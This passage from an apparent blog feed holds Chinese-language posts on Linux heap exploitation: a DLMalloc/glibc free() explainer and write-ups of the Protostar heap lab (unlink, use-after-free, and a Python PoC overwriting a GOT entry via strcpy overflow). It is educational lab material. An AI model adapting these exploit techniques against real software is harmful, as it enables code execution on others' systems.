src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%203/0-6.png?raw=true" alt="0-6"><br>GoT地址已经修改，下面可以看到已经执行了winnwe()函数<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%203/0-7.png?raw=true" alt="0-7"></p><h2 id="0x04-一点补充"><a href="#0x04-一点补充" class="headerlink" title="0x04 一点补充"></a>0x04 一点补充</h2><p>在上面构造chunk中，也许你已经发现了chunk大小为<code>0xfffffffc</code>，这是一个什么巧妙的方法去绕过free()里面的检查等。具体的细节可以看<br><a href="http://phrack.org/issues/57/9.html#article" target="_blank" rel="external">Once upon a free()</a>这篇文章，简单的说就是当某个数加上<code>0xfffffffc</code>时会造成溢出相当于减4从而使其向前偏移4个字节，绕过检查，避免崩溃。</p><h2 id="0x05-堆漏洞学习总结"><a href="#0x05-堆漏洞学习总结" class="headerlink" title="0x05 堆漏洞学习总结"></a>0x05 堆漏洞学习总结</h2><p>目前可能这是最后一个堆漏洞的学习，这个堆漏洞的学习理解到动手前后花费了大量时间，不过这都是值得的，如果能够坚持下来，将会对堆漏洞有一个清晰的认识。以后再遇到漏洞或者别人的分析能够快速准确的理解。虽然现在堆管理代码经过了很多改善和patch，但基本和关键的技术还是没变。所以keep hacking!</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-序&quot;&gt;&lt;a href=&quot;#0x00-序&quot; class=&quot;headerlink&quot; title=&quot;0x00 序&quot;&gt;&lt;/a&gt;0x00 序&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt; 学习最后一个堆溢出漏洞，在这之前，强烈建议先阅读下我之前对&lt;a href=&quot;ht
      
    
    </summary>
    
      <category term="Linux堆栈漏洞学习系列" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/Linux%E5%A0%86%E6%A0%88%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%B3%BB%E5%88%97/"/>
    
    
      <category term="Linux" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Linux/"/>
    
      <category term="Protostar" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Protostar/"/>
    
      <category term="堆溢出" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/%E5%A0%86%E6%BA%A2%E5%87%BA/"/>
    
      <category term="metadata" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/metadata/"/>
    
      <category term="DLMalloc" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/DLMalloc/"/>
    
  </entry>
  
  <entry>
    <title>深入理解Linux堆分配器-DLMalloc</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2017/04/23/Linux%E5%A0%86%E5%88%86%E9%85%8D%E5%99%A8-DLMalloc/Linux%E5%A0%86%E5%88%86%E9%85%8D%E5%99%A8-DLMalloc/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2017/04/23/Linux堆分配器-DLMalloc/Linux堆分配器-DLMalloc/</id>
    <published>2017-04-23T04:16:00.000Z</published>
    <updated>2019-02-21T10:00:36.874Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-序"><a href="#0x00-序" class="headerlink" title="0x00 序"></a>0x00 序</h2><blockquote><p> 当学习漏洞利用到一定阶段的时候，就需要对操作系统层面有足够的认识。无疑Linux的堆管理一直是不能甚解。因此这篇文章将对Linux的DLMalloc进行详细的介绍，以此对操作系统的堆管理有一个清晰整体的认识，当我在学习的过程中，好像没有发现一篇中文文章来详细介绍相关内容，所以本文仅仅是我通过学习和实践得到的理解，若有不对，请指出。</p></blockquote><h2 id="0x01-目录"><a href="#0x01-目录" class="headerlink" title="0x01 目录"></a>0x01 目录</h2><p>1.DLMalloc<br>2.内存Chunk<br>3.Bin<br>4.malloc源码free()函数分析</p><h2 id="0x02-DLMalloc"><a href="#0x02-DLMalloc" class="headerlink" title="0x02 DLMalloc"></a>0x02 DLMalloc</h2><p>Doug Lea’s Malloc (dlmalloc)是一个GNU C库的内存分配器，它能够通过calloc(),malloc(), free()和realloc()等动态分配和释放的函数来管理内存。<br>明显内存分配器在操作系统中是相当重要的，主要在需要满足下列的特点：</p><ul><li>稳定性(stability)</li><li>性能(performance)</li><li>避免碎片化(avoidance of fragmentation)</li><li>低空间开销(low space overhead）<br>根据上面的内存特点，将有助于后面对chunk以及Bin等的理解。</li></ul><h2 id="0x03-内存chunk"><a href="#0x03-内存chunk" class="headerlink" title="0x03 内存chunk"></a>0x03 内存chunk</h2><p>1.什么是chunk？<br>chunk是堆中一些连续的内存块，可以用作分配，释放，拆分，合并。不存在两个连续的释放chunk，这是在于相邻的chunk会合并。</p><p>2.数据结构</p><pre><code>struct malloc_chunk {    INTERNAL_SIZE_T prev_size; //当前chunk前一个chunk的大小，仅在前一个为freed才使用    INTERNAL_SIZE_T size;      //当前chunk的大小    struct malloc_chunk * fd;  //如果当前为释放chunk，指向双向free list中前一个chunk    struct malloc_chunk * bk;  //如果当前为释放chunk，指向双向free list中后一个chunk}</code></pre><p>根据上面的描述我们可以知道，chunk在分配时和释放时数据结构是不同的，看下面的图例:</p><ul><li>allocate chunk<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Linux%E5%A0%86%E5%88%86%E9%85%8D%E5%99%A8-DLMalloc/0-0.png?raw=true" alt="0-0"></li></ul><ul><li>freed chunk<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Linux%E5%A0%86%E5%88%86%E9%85%8D%E5%99%A8-DLMalloc/0-1.png?raw=true" alt="0-1"></li></ul><p>3.更多细节<br>因为chunk是按照8字节对齐的，所以当前块中的size低三位将用作相关标志，从右到左A M P分别代表：是否在主heap？是否通过mmap()分配？前一个chunk是否在使用？<br>然后可以想到有一个最小chunk的存在，其大小为16字节()。  </p><p>4.特殊chunk<br>top chunk:指可能内存边界的末端，也被称作wilderness chunk。如果其他bin都不满足malloc的情况下，就会从top chunk里去一部分去满足分配请求，剩余的则作为新的top chunk，并且top chunk不在任何一个bin中。随着被分离和合并top chunk会增大和减小。</p><p>last_remainder:和top chunk一样，不在任何一个bin中，但最终可能会合并到一个bin中。可以看英文原文解释：The last_remainder chunk is the result of allocation requests for small chunks that have no exact fit in any of the bins. If the request is larger than the last_remainder chunk but smaller than a block in a bin, then the chunk is split again. The last_remainder chunk is the result of having to split a larger chunk into two, one part of it is handed out from the allocation, and the other because the last_remainder chunk.</p><h2 id="0x04-Bin"><a href="#0x04-Bin" class="headerlink" title="0x04 Bin"></a>0x04 Bin</h2><p>chunk一旦被释放后就会被存储在叫做Bin的链表中，Bin有不同大小的链表，方便与下次查找到最适当的chunk。通常来说有small-bin，large-bin，fast-bin。<br>这里我主要介绍fsatbin和normalbin</p><p>(1)fastbin：是一种单链表bin，不同系统定义了一个最大值，当chunk大小小于等于这个最大值时，就会被释放到fastbin中，正如名字那样，为了更快的free和malloc，这个链表是无序的，是后进先出（LIFO），并且不与其他chunk合并。<br>(2)normalbin:是一种双向链表bin，当chunk大小大于fastbin的大小时就会被放入这个bin，并且有着各种大小的normalbin(减少碎片)，bin内部的chunk按大小组织起来。释放后会于相邻的chunk合并。</p><h2 id="0x05-free-源代码分析及相关细节"><a href="#0x05-free-源代码分析及相关细节" class="headerlink" title="0x05 free()源代码分析及相关细节"></a>0x05 free()源代码分析及相关细节</h2><p><code>free(void *mem)--&gt;__libc_free(void *mem)</code></p><pre><code>void__libc_free (void *mem){  mstate ar_ptr;  mchunkptr p;                          /* chunk corresponding to mem */  void (*hook) (void *, const void *)    = atomic_forced_read (__free_hook);  if (__builtin_expect (hook != NULL, 0))    {      (*hook)(mem, RETURN_ADDRESS (0));      return;    }  if (mem == 0)                              /* free(0) has no effect */    return;  p = mem2chunk (mem);  if (chunk_is_mmapped (p))                       /* release mmapped memory. */    {      /* See if the dynamic brk/mmap threshold needs adjusting.         Dumped fake mmapped chunks do not affect the threshold.  */      if (!mp_.no_dyn_threshold          &amp;&amp; chunksize_nomask (p) &gt; mp_.mmap_threshold          &amp;&amp; chunksize_nomask (p) &lt;= DEFAULT_MMAP_THRESHOLD_MAX          &amp;&amp; !DUMPED_MAIN_ARENA_CHUNK (p))        {          mp_.mmap_threshold = chunksize (p);          mp_.trim_threshold = 2 * mp_.mmap_threshold;          LIBC_PROBE (memory_mallopt_free_dyn_thresholds, 2,                      mp_.mmap_threshold, mp_.trim_threshold);        }      munmap_chunk (p);      return;    }  ar_ptr = arena_for_chunk (p);  _int_free (ar_ptr, p, 0); //跳转到_int_free}</code></pre><p>我们先不关注其他的，只需要知道会调用_int_free就就可以了</p><p><code>__libc_free(void *mem)--&gt;_int_free (mstate av, mchunkptr p, int have_lock)</code></p><pre><code>static void_int_free (mstate av, mchunkptr p, int have_lock){  INTERNAL_SIZE_T size;        /* 当前chunk的大小 */  mfastbinptr *fb;             /* 相关的fastbin */  mchunkptr nextchunk;         /* 下一个相邻的chunk */  INTERNAL_SIZE_T nextsize;    /* 下一个chunk的大小 */  int nextinuse;               /* 下一个chunk正在使用时为真 */  INTERNAL_SIZE_T prevsize;    /* 前一个chunk的大小 */  mchunkptr bck;               /* 指向free链表中向后一个chunk */  mchunkptr fwd;               /* 指向free链表中向前一个chunk */  const char *errstr = NULL;  int locked = 0;  size = chunksize (p);  /* Little security check which won&#39;t hurt performance: the     allocator never wrapps around at the end of the address space.     Therefore we can exclude some size values which might appear     here by accident or by &quot;design&quot; from some intruder.  */  //一些安全检查  if (__builtin_expect ((uintptr_t) p &gt; (uintptr_t) -size, 0)      || __builtin_expect (misaligned_chunk (p), 0))    {      errstr = &quot;free(): invalid pointer&quot;;    errout:      if (!have_lock &amp;&amp; locked)        __libc_lock_unlock (av-&gt;mutex);      malloc_printerr (check_action, errstr, chunk2mem (p), av);      return;    }  /* We know that each chunk is at least MINSIZE bytes in size or a multiple of MALLOC_ALIGNMENT.  */   //检查是否满足大于等于最小大小  if (__glibc_unlikely (size &lt; MINSIZE || !aligned_OK (size)))    {      errstr = &quot;free(): invalid size&quot;;      goto errout;    }  check_inuse_chunk(av, p); //检查当前chunk是否在使用  /*    如果满足，则将该chunk放入fastbin以便malloc时能够快速找到和使用  */  if ((unsigned long)(size) &lt;= (unsigned long)(get_max_fast ())#if TRIM_FASTBINS      /*        If TRIM_FASTBINS set, don&#39;t place chunks        bordering top into fastbins      */      &amp;&amp; (chunk_at_offset(p, size) != av-&gt;top)#endif      ) {    if (__builtin_expect (chunksize_nomask (chunk_at_offset (p, size))                          &lt;= 2 * SIZE_SZ, 0)        || __builtin_expect (chunksize (chunk_at_offset (p, size))                             &gt;= av-&gt;system_mem, 0))      {        /* We might not have a lock at this point and concurrent modifications           of system_mem might have let to a false positive.  Redo the test           after getting the lock.  */        if (have_lock            || ({ assert (locked == 0);                  __libc_lock_lock (av-&gt;mutex);                  locked = 1;                  chunksize_nomask (chunk_at_offset (p, size)) &lt;= 2 * SIZE_SZ                    || chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem;              }))          {            errstr = &quot;free(): invalid next size (fast)&quot;;            goto errout;          }        if (! have_lock)          {            __libc_lock_unlock (av-&gt;mutex);            locked = 0;          }      }    free_perturb (chunk2mem(p), size - 2 * SIZE_SZ);    set_fastchunks(av);    unsigned int idx = fastbin_index(size);    fb = &amp;fastbin (av, idx);    /* Atomically link P to its fastbin: P-&gt;FD = *FB; *FB = P;  */    mchunkptr old = *fb, old2;    unsigned int old_idx = ~0u;    do      {        /* Check that the top of the bin is not the record we are going to add           (i.e., double free).  */        if (__builtin_expect (old == p, 0))          {            errstr = &quot;double free or corruption (fasttop)&quot;;            goto errout;          }        /* Check that size of fastbin chunk at the top is the same as           size of the chunk that we are adding.  We can dereference OLD           only if we have the lock, otherwise it might have already been           deallocated.  See use of OLD_IDX below for the actual check.  */        if (have_lock &amp;&amp; old != NULL)          old_idx = fastbin_index(chunksize(old));        p-&gt;fd = old2 = old;      }    while ((old = catomic_compare_and_exchange_val_rel (fb, p, old2)) != old2);    if (have_lock &amp;&amp; old != NULL &amp;&amp; __builtin_expect (old_idx != idx, 0))      {        errstr = &quot;invalid fastbin entry (free)&quot;;        goto errout;      }  }  /*    Consolidate other non-mmapped chunks as they arrive.  */  //检查是否是通过mmap()分配的内存  else if (!chunk_is_mmapped(p)) {    if (! have_lock) {      __libc_lock_lock (av-&gt;mutex);      locked = 1;    }    nextchunk = chunk_at_offset(p, size);//返回下一个chunk的地址    /* Lightweight tests: check whether the block is already the       top block.  */    //检查下一个是否为top-chunk    if (__glibc_unlikely (p == av-&gt;top))      {        errstr = &quot;double free or corruption (top)&quot;;        goto errout;      }    /* Or whether the next chunk is beyond the boundaries of the arena.  */    if (__builtin_expect (contiguous (av)                          &amp;&amp; (char *) nextchunk                          &gt;= ((char *) av-&gt;top + chunksize(av-&gt;top)), 0))      {        errstr = &quot;double free or corruption (out)&quot;;        goto errout;      }    /* Or whether the block is actually not marked used.  */    if (__glibc_unlikely (!prev_inuse(nextchunk)))      {        errstr = &quot;double free or corruption (!prev)&quot;;        goto errout;      }    nextsize = chunksize(nextchunk);    if (__builtin_expect (chunksize_nomask (nextchunk) &lt;= 2 * SIZE_SZ, 0)        || __builtin_expect (nextsize &gt;= av-&gt;system_mem, 0))      {        errstr = &quot;free(): invalid next size (normal)&quot;;        goto errout;      }    free_perturb (chunk2mem(p), size - 2 * SIZE_SZ);    /* 与后面chunk一个合并 */    if (!prev_inuse(p)) {      prevsize = prev_size (p);      size += prevsize;      p = chunk_at_offset(p, -((long) prevsize));      unlink(av, p, bck, fwd);//将后一个chunk从双向链表上取下来    }    if (nextchunk != av-&gt;top) {      /* get and clear inuse bit */      nextinuse = inuse_bit_at_offset(nextchunk, nextsize);      /* 与前面chunk一个合并*/      if (!nextinuse) {        unlink(av, nextchunk, bck, fwd);//将前一个chunk从双向链表上取下来        size += nextsize;      } else        clear_inuse_bit_at_offset(nextchunk, 0);      /*        Place the chunk in unsorted chunk list. Chunks are        not placed into regular bins until after they have        been given one chance to be used in malloc.      */      bck = unsorted_chunks(av);      fwd = bck-&gt;fd;      if (__glibc_unlikely (fwd-&gt;bk != bck))        {          errstr = &quot;free(): corrupted unsorted chunks&quot;;          goto errout;        }      p-&gt;fd = fwd;      p-&gt;bk = bck;      if (!in_smallbin_range(size))        {          p-&gt;fd_nextsize = NULL;          p-&gt;bk_nextsize = NULL;        }      bck-&gt;fd = p;      fwd-&gt;bk = p;      set_head(p, size | PREV_INUSE);      set_foot(p, size);      check_free_chunk(av, p);    }    /*      如果当前chunk正好与topchunk相邻，则合并到topchunk    */    else {      size += nextsize;      set_head(p, size | PREV_INUSE);      av-&gt;top = p;      check_chunk(av, p);    }    /*      If freeing a large space, consolidate possibly-surrounding      chunks. Then, if the total unused topmost memory exceeds trim      threshold, ask malloc_trim to reduce top.      Unless max_fast is 0, we don&#39;t know if there are fastbins      bordering top, so we cannot tell for sure whether threshold      has been reached unless fastbins are consolidated.  But we      don&#39;t want to consolidate on each free.  As a compromise,      consolidation is performed if FASTBIN_CONSOLIDATION_THRESHOLD      is reached.    */    if ((unsigned long)(size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) {      if (have_fastchunks(av))        malloc_consolidate(av);      if (av == &amp;main_arena) {#ifndef MORECORE_CANNOT_TRIM        if ((unsigned long)(chunksize(av-&gt;top)) &gt;=            (unsigned long)(mp_.trim_threshold))          systrim(mp_.top_pad, av);#endif      } else {        /* Always try heap_trim(), even if the top chunk is not           large, because the corresponding heap might go away.  */        heap_info *heap = heap_for_ptr(top(av));        assert(heap-&gt;ar_ptr == av);        heap_trim(heap, mp_.top_pad);      }    }    if (! have_lock) {      assert (locked);      __libc_lock_unlock (av-&gt;mutex);    }  }  /*    If the chunk was allocated via mmap, release via munmap().  */  else {    munmap_chunk (p);  }}</code></pre><p>这里看看<code>unlink()</code>宏定义</p><pre><code>#define unlink( P, BK, FD ) {                BK = P-&gt;bk;                              FD = P-&gt;fd;                              FD-&gt;bk = BK;  //可能会造成任意写                           BK-&gt;fd = FD;                         }</code></pre><p>现在我们重点放在<code>unlink()</code>，当两个相邻chunk需要合并的时候，势必需要将临近的chunk从原来的双链表上取下来，然后与当前chunk合并成一个更大的块。等等！怎么取下来的呢？如果这里存在一个恶意的chunk即fd和bk都是一些恶意地址指针，则会出现任意地址写的一个漏洞。在这里我们就先不去讨论进一步的利用过程，只需知道存在一个这样的漏洞即可，后面会根据这个分析去漏洞利用。</p><p><a href="https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#__libc_free" target="_blank" rel="external">glibc/malloc.c源码</a></p><h2 id="0x06-参考"><a href="#0x06-参考" class="headerlink" title="0x06 参考"></a>0x06 参考</h2><ol><li><a href="http://phrack.org/issues/57/8.html#article" target="_blank" rel="external">Vudo malloc tricks</a></li><li><a href="http://gee.cs.oswego.edu/dl/html/malloc.html" target="_blank" rel="external">A Memory Allocator</a></li><li><a href="http://phrack.org/issues/57/9.html#article" target="_blank" rel="external">Once upon a free()</a></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-序&quot;&gt;&lt;a href=&quot;#0x00-序&quot; class=&quot;headerlink&quot; title=&quot;0x00 序&quot;&gt;&lt;/a&gt;0x00 序&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt; 当学习漏洞利用到一定阶段的时候，就需要对操作系统层面有足够的认识。无疑Linux
      
    
    </summary>
    
      <category term="pwn" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/pwn/"/>
    
    
      <category term="linux" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/linux/"/>
    
      <category term="heap" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/heap/"/>
    
      <category term="malloc" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/malloc/"/>
    
      <category term="free" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/free/"/>
    
  </entry>
  
  <entry>
    <title>Protostar-堆溢出学习-UAF(use after free)</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2017/04/21/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%202/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%202/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2017/04/21/Protostar-堆溢出系列学习-heap 2/Protostar-堆溢出系列学习-heap 2/</id>
    <published>2017-04-21T03:12:19.000Z</published>
    <updated>2017-05-02T14:34:52.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-序"><a href="#0x00-序" class="headerlink" title="0x00 序"></a>0x00 序</h2><blockquote><p>下面看一个堆中常见的漏洞-UAF(use after free)</p></blockquote><h2 id="0x01-C语言源代码"><a href="#0x01-C语言源代码" class="headerlink" title="0x01 C语言源代码"></a>0x01 C语言源代码</h2><pre><code>#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;string.h&gt;#include &lt;sys/types.h&gt;#include &lt;stdio.h&gt;struct auth {  char name[32];  int auth;};struct auth *auth;char *service;int main(int argc, char **argv){  char line[128];  while(1) {      printf(&quot;[ auth = %p, service = %p ]\n&quot;, auth, service);      if(fgets(line, sizeof(line), stdin) == NULL) break;      if(strncmp(line, &quot;auth &quot;, 5) == 0) {          auth = malloc(sizeof(auth));          memset(auth, 0, sizeof(auth));          if(strlen(line + 5) &lt; 31) {              strcpy(auth-&gt;name, line + 5);          }      }      if(strncmp(line, &quot;reset&quot;, 5) == 0) {          free(auth);      }      if(strncmp(line, &quot;service&quot;, 6) == 0) {          service = strdup(line + 7);      }      if(strncmp(line, &quot;login&quot;, 5) == 0) {          if(auth-&gt;auth) {              printf(&quot;you have logged in already!\n&quot;);          } else {              printf(&quot;please enter your password\n&quot;);          }      }  }}</code></pre><h2 id="0x02-分析-amp-思考"><a href="#0x02-分析-amp-思考" class="headerlink" title="0x02 分析&amp;思考"></a>0x02 分析&amp;思考</h2><p>程序有4个命令，对<code>auth</code>这个结构体进行分配内存以及释放内存，然后有结构体里的<code>auth-&gt;auth</code>来决定是否授权。很明显让我们修改<code>auth-&gt;auth</code>的值。<br>reset命令释放<code>auth</code>但没有设为null，后面<code>auth-&gt;auth</code>发生引用。所以这里有个UAF漏洞。</p><h2 id="0x03-调试-amp-hack"><a href="#0x03-调试-amp-hack" class="headerlink" title="0x03 调试&amp;hack"></a>0x03 调试&amp;hack</h2><p>1.在第一个printf处下个断点，观察每次分配和释放后堆，auth以及service的情况</p><p>2.先输入<code>auth admin</code>，然后输入<code>login</code>试试<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%202/0-0.png?raw=true" alt="0-0"><br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%202/nologin.png?raw=true" alt="nologin"><br>3.再输入<code>reset</code>释放堆内存<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%202/0-1.png?raw=true" alt="0-1"><br>4.输入<code>service</code>分配内存<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%202/0-2.png?raw=true" alt="0-2"><br>5.以上我们可以发现，给service分配的内存居然也指向auth的地址？因为之前free了auth，所以系统认为这段内存为可用，当再次分配的时候就会返回对应内存。基于此，我们继续给service分配内存，让其覆盖<code>auth-&gt;auth</code>的内存值。<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%202/0-3.png?raw=true" alt="0-3"><br>6.再次输入<code>login</code>命令<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%202/0-4.png?raw=true" alt="0-4"></p><h2 id="0x04-一点感受"><a href="#0x04-一点感受" class="headerlink" title="0x04 一点感受"></a>0x04 一点感受</h2><p>通过这个例子简单的学习了UAF漏洞后，无疑free后不设为null，后果是不敢想象的。继续学习堆相关的漏洞利用。keep hack！</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-序&quot;&gt;&lt;a href=&quot;#0x00-序&quot; class=&quot;headerlink&quot; title=&quot;0x00 序&quot;&gt;&lt;/a&gt;0x00 序&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;下面看一个堆中常见的漏洞-UAF(use after free)&lt;/p&gt;
&lt;/bl
      
    
    </summary>
    
      <category term="Linux堆栈漏洞学习系列" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/Linux%E5%A0%86%E6%A0%88%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%B3%BB%E5%88%97/"/>
    
    
      <category term="Linux" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Linux/"/>
    
      <category term="Protostar" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Protostar/"/>
    
      <category term="堆溢出" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/%E5%A0%86%E6%BA%A2%E5%87%BA/"/>
    
      <category term="UAF" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/UAF/"/>
    
  </entry>
  
  <entry>
    <title>Protostar-堆溢出学习-strcpy堆指针造成任意地址GOT表写</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2017/04/19/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%201/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%201/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2017/04/19/Protostar-堆溢出系列学习-heap 1/Protostar-堆溢出系列学习-heap 1/</id>
    <published>2017-04-19T03:12:19.000Z</published>
    <updated>2017-05-02T14:34:42.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-序"><a href="#0x00-序" class="headerlink" title="0x00 序"></a>0x00 序</h2><blockquote><p> 现在我们来学习一下利用堆溢出修改GOT表达到代码劫持的列子。</p></blockquote><h2 id="0x01-C语言源代码"><a href="#0x01-C语言源代码" class="headerlink" title="0x01 C语言源代码"></a>0x01 C语言源代码</h2><pre><code>#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;string.h&gt;#include &lt;stdio.h&gt;#include &lt;sys/types.h&gt;struct internet {  int priority;  char *name;};void winner(){  printf(&quot;and we have a winner @ %d\n&quot;, time(NULL));}int main(int argc, char **argv){  struct internet *i1, *i2, *i3;  i1 = malloc(sizeof(struct internet));  i1-&gt;priority = 1;  i1-&gt;name = malloc(8);  i2 = malloc(sizeof(struct internet));  i2-&gt;priority = 2;  i2-&gt;name = malloc(8);  strcpy(i1-&gt;name, argv[1]);  strcpy(i2-&gt;name, argv[2]);  printf(&quot;and that&#39;s a wrap folks!\n&quot;);}</code></pre><h2 id="0x02-简单的分析-amp-思考"><a href="#0x02-简单的分析-amp-思考" class="headerlink" title="0x02 简单的分析&amp;思考"></a>0x02 简单的分析&amp;思考</h2><p>如果之前没有相关的漏洞利用经验的话，一时还是想不到怎么去利用这个堆溢出漏洞。但这里有两个<code>strcpy</code>，肯定是要去覆盖和修改某个地方的地址。<br>其实<code>strcpy</code>这个函数是非常危险的，既能溢出，又能对任意地址进行写操作。<br>在这个列子中，我们就借此去修改<code>printf</code>函数的GOT表。</p><h2 id="0x03-调试"><a href="#0x03-调试" class="headerlink" title="0x03 调试"></a>0x03 调试</h2><p>1.查看堆分配情况<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%201/0-0.png?raw=true" alt="0-0"><br>2.查看汇编代码，找到执行入口<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%201/0-1.png?raw=true" alt="0-1"><br>3.首先利用第一个<code>strcpy</code>将i2的name指针改为GOT表地址，然后利用第二个<code>strcpy</code>向这个地址写入<code>winner</code>的地址，由此编写对应的Python PoC</p><pre><code>import structpadding = &quot;AAAA&quot;*5put_got = struct.pack(&quot;I&quot;, 0x8049774) #put的GOT表地址space = &quot; &quot;winner = struct.pack(&quot;I&quot;, 0x8048494) #winner函数地址print padding+put_got+space+winner</code></pre><p>4.hack</p><pre><code>user@protostar:/tmp$ /opt/protostar/bin/heap1 `python  heap1.py`and we have a winner @ 1492452139</code></pre><p><strong>成功执行winner函数</strong></p><h1 id="0x04-一点感受"><a href="#0x04-一点感受" class="headerlink" title="0x04 一点感受"></a>0x04 一点感受</h1><p>学到现在，感受很多，对用户输入的数据完全信任是多么的可怕。可能有一万种的方法去利用这个漏洞达到代码执行。比如这里，将<code>strcpy</code>改为<code>strncpy</code>或者在copy前先检查下长度的话就能避免。所以写好一个有质量的代码是多么重要。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-序&quot;&gt;&lt;a href=&quot;#0x00-序&quot; class=&quot;headerlink&quot; title=&quot;0x00 序&quot;&gt;&lt;/a&gt;0x00 序&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt; 现在我们来学习一下利用堆溢出修改GOT表达到代码劫持的列子。&lt;/p&gt;
&lt;/blo
      
    
    </summary>
    
      <category term="Linux堆栈漏洞学习系列" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/Linux%E5%A0%86%E6%A0%88%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%B3%BB%E5%88%97/"/>
    
    
      <category term="Linux" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Linux/"/>
    
      <category term="Protostar" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Protostar/"/>
    
      <category term="堆溢出" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/%E5%A0%86%E6%BA%A2%E5%87%BA/"/>
    
      <category term="strcpy" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/strcpy/"/>
    
      <category term="GOT表" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/GOT%E8%A1%A8/"/>
    
  </entry>
  
  <entry>
    <title>Protostar-堆溢出学习-覆盖堆函数指针劫持代码流</title>
